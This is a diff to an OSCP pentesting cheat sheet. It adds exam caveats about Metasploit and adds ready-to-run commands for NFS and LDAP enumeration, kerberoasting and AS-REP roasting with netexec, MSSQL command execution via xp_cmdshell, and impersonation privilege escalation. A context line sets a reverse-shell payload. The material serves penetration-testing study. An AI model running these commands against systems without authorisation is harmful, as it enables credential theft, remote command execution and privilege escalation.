@@ -107,7 +107,7 @@ set FTPUSER <user>
 set FTPPASS <pass>
 run
 ```
-Good for a quick IPv4 sweep; does not support IPv6 (use manual `EPRT` for that).
+Good for a quick IPv4 sweep; does not support IPv6 (use manual `EPRT` for that). **Exam caveat: on the OSCP exam, Metasploit (including this module) may only be run against the single machine you've designated for Metasploit use, and never used to scan or pivot toward other hosts — treat this as reference-only unless that condition is met; the manual `EPRT`/`PORT` sequence and `nmap -b` above are the exam-safe defaults.**
 Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
 
 **10. Config-file hunting after a foothold**
@@ -530,7 +530,7 @@ These three services are recurring OSCP/PWK enumeration targets because they fre
 
 - **RPC (port 111/135 + high ports)**: `rpcinfo` fingerprints registered RPC services (NFS, mountd, NIS, status daemons) on a portmapper; `rpcclient` abuses SMB/MSRPC null sessions on Windows/Samba hosts to pull users, groups, domain info, and password policy without credentials.
 - **NFS (port 2049 + mountd)**: `showmount` reveals exported shares without authentication; NFSv3's client-trusted UID/GID model means access control is only as strong as the attacker's ability to spoof a UID — `no_root_squash` is the headline misconfiguration, but UID-matching and SSH-key-planting techniques extend exploitation even when root is squashed.
-- **LDAP (port 389/636, 3268/3636 GC)**: Many AD environments and most standalone OpenLDAP boxes in labs allow anonymous/simple binds. `ldapsearch` is the raw tool; `windapsearch` and `ldapdomaindump` are Python wrappers that structure the same LDAP queries into usable output (user/group/computer lists, HTML domain reports).
+- **LDAP (port 389/636, 3268/3269 GC)**: Many AD environments and most standalone OpenLDAP boxes in labs allow anonymous/simple binds. `ldapsearch` is the raw tool; `windapsearch` and `ldapdomaindump` are Python wrappers that structure the same LDAP queries into usable output (user/group/computer lists, HTML domain reports).
 
 ---
 
@@ -689,6 +689,13 @@ umount /mnt/nfs-share
 Standard cleanup step; leaving stale NFS mounts on the attack box can hang subsequent `showmount`/`mount` attempts against other hosts.
 Source: General NFS operational practice, cross-referenced with [NFS Share no_root_squash — Juggernaut-Sec](https://juggernaut-sec.com/nfs-no_root_squash/)
 
+**17b. Nmap NFS NSE sweep (companion/alternative to showmount)**
+```
+nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target-ip>
+```
+`nfs-showmount` mirrors `showmount -e` (export list), `nfs-ls` recursively lists file contents of each export without mounting, and `nfs-statfs` reports filesystem usage/free space — all unauthenticated and useful when a mount isn't immediately available or you just need a fast read-only inventory.
+Source: [nfs-showmount NSE](https://nmap.org/nsedoc/scripts/nfs-showmount.html), [nfs-ls NSE](https://nmap.org/nsedoc/scripts/nfs-ls.html), [nfs-statfs NSE](https://nmap.org/nsedoc/scripts/nfs-statfs.html)
+
 ---
 
 ### LDAP Enumeration
@@ -706,6 +713,18 @@ ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" > ldap_full_dump.txt
 ```
 With no filter supplied, this pulls every readable object under the base DN in one shot — the fastest way to see whether anonymous bind is fully open (common on standalone OpenLDAP boxes in labs) versus AD's typical Root-DSE-only exposure. Pipe to a file since output can be very large.
 Source: [htb_oscp_notes/ldap.md — islanddog](https://github.com/islanddog/htb_oscp_notes/blob/main/ldap.md); [Exploiting LDAP Server NULL Bind — n00py Blog](https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/)
+
+**Faster (nxc):** findings 20-27 below (users, groups, computers, password policy, Domain Admins/privileged users, delegation) can each be replaced with a single netexec flag once you have (or are testing) a credential:
+```
+nxc ldap <dc-ip> -u <user> -p <pass> --users
+nxc ldap <dc-ip> -u <user> -p <pass> --groups
+nxc ldap <dc-ip> -u <user> -p <pass> --admin-count
+nxc ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation
+nxc ldap <dc-ip> -u <user> -p <pass> --asreproast asrep_hashes.txt
+nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting kerb_hashes.txt
+```
+Keep the manual `ldapsearch`/`windapsearch`/`ldapdomaindump` workflow below for when nxc isn't installed or you need a raw/custom filter.
+Source: [NetExec-Wiki — ldap-protocol](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/ldap-protocol)
 
 **20. Enumerate all user objects**
 ```
@@ -787,6 +806,21 @@ ldapdomaindump -u 'CORP\lowpriv' -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee
 ```
 `-p LM:NTLM` authenticates with a cracked/dumped NTLM hash instead of a cleartext password (no crack needed, `-at NTLM` is default); `-r` resolves computer hostnames via `-n <dns-server-ip>`, filling in IP addresses in the HTML computers report so it's immediately targetable.
 Source: [ldapdomaindump — dirkjanm, GitHub README](https://github.com/dirkjanm/ldapdomaindump)
+
+**31. LDAPS (LDAP over SSL, port 636) — encrypted anonymous bind**
+```
+ldapsearch -x -H ldaps://<target-ip> -s base namingcontexts
+```
+Same Root-DSE query as finding 18 but over TLS on 636 — test this whenever plaintext 389 is filtered/blocked but 636 is open (common on hardened DCs), or when the target enforces LDAP signing/channel binding and rejects unsigned plaintext queries.
+Source: [LDAP Anonymous Bind — Port 389 — Medium/Vinay A S](https://medium.com/@vinayas23913/ldap-anonymous-bind-9c023c6f9b04)
+
+**32. Global Catalog query (port 3268 / 3269 GC-over-SSL)**
+```
+ldapsearch -x -H ldap://<target-ip>:3268 -b "DC=corp,DC=local" "(sAMAccountName=*)" sAMAccountName
+ldapsearch -x -H ldaps://<target-ip>:3269 -b "DC=corp,DC=local" "(sAMAccountName=*)" sAMAccountName
+```
+The Global Catalog (3268 plaintext, 3269 over SSL) exposes a forest-wide partial attribute set across *all* domains in a forest from a single query — useful in multi-domain environments where the base-DN queries above (finding 19-22) only see the local domain.
+Source: [Microsoft — Global Catalog and LDAP Searches](https://learn.microsoft.com/en-us/windows/win32/ad/global-catalog-and-ldap-searches)
 
 ---
 
@@ -1388,7 +1422,7 @@ set RHOSTS <target>
 set COMMUNITY public
 run
 ```
-Metasploit's built-in full enumerator — alternative to snmp-check for structured output (hardware, storage, users, processes, network config).
+Metasploit's built-in full enumerator — alternative to snmp-check for structured output (hardware, storage, users, processes, network config). **Exam caveat: like all Metasploit modules, this is only usable against the single machine you've designated for Metasploit use on exam day — do not run it against multiple targets; `snmp-check`/`snmpwalk` above are the exam-safe, reusable equivalents.**
 Source: [htb-Penetration-Testing-Cheat-Sheet — SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
 
 **Useful OID — system description**
@@ -1947,6 +1981,13 @@ EXEC master..xp_cmdshell 'whoami';
 Required when using a client other than mssqlclient (e.g. sqlcmd, a web-based SQLi) — advanced options must be exposed before `xp_cmdshell` itself can be toggled.
 Source: [thewhiteh4t — MSSQL Pentesting Cheatsheet](https://thewhiteh4t.github.io/blog/mssql-pentesting-cheatsheet/), [PowerUpSQL / HackTricks MSSQL AD Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
+**Faster (nxc):** `nxc mssql` auto-enables `xp_cmdshell` and runs a command in one step, skipping the manual `sp_configure`/`enable_xp_cmdshell` dance above:
+```
+nxc mssql <target-ip> -u <user> -p <pass> -x "whoami"
+nxc mssql <target-ip> -u <user> -p <pass> -X "whoami"        # PowerShell instead of cmd
+```
+Source: [NetExec-Wiki — mssql-protocol](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/mssql-protocol)
+
 **Enumerate and use linked servers (mssqlclient built-ins)**
 ```
 SQL> enum_links
@@ -1992,6 +2033,12 @@ REVERT;
 ```
 If the current login has `IMPERSONATE` rights on a higher-privileged login (commonly `sa`), `EXECUTE AS LOGIN` elevates the session's effective server role to sysadmin without a password; `REVERT` drops back.
 Source: [NetSPI — Hacking SQL Server Stored Procedures: User Impersonation](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/), [HackTricks — Abusing AD MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
+
+**Faster (nxc):** the `mssql_priv` check module enumerates and exploits impersonation-based privesc (including chained `EXECUTE AS`) without hand-writing the SQL above:
+```
+nxc mssql <target-ip> -u <user> -p <pass> -M mssql_priv
+```
+Source: [NetExec-Wiki — mssql-protocol modules](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/mssql-protocol)
 
 ### Tools table
 | Tool | Purpose |
@@ -2138,7 +2185,7 @@ set PASSWORD <password>
 set PAYLOAD cmd/unix/reverse
 run
 ```
-Automates the same `COPY FROM PROGRAM` technique against valid, sufficiently-privileged credentials without hand-writing the SQL.
+Automates the same `COPY FROM PROGRAM` technique against valid, sufficiently-privileged credentials without hand-writing the SQL. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine you've locked in for Metasploit use and cannot be run against additional targets — the manual `COPY ... FROM PROGRAM` SQL above works everywhere and should be the default technique.**
 Source: [Exploit-DB 46813](https://www.exploit-db.com/exploits/46813)
 
 ### Tools table
